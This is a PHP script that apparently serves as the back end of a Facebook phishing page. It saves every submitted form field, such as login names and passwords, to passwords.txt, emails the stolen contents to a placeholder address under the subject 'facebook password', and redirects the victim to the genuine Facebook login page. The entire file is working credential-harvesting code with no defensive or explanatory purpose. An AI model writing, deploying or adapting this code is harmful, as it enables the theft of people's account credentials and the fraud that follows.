<?php
header("Location: https://am-et.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110");
$handle = fopen("passwords.txt","w");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n\n");
}
fwrite($handle, "\r\n");
fclose($handle);


$password= file_get_contents( "passwords.txt" );
$to      = 'youremail@email.com';
$subject = 'facebook password';
$message = $password;
$headers = 'From: webmaster@example.com' . "\r\n" .
    'Reply-To: webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);


exit;
?>
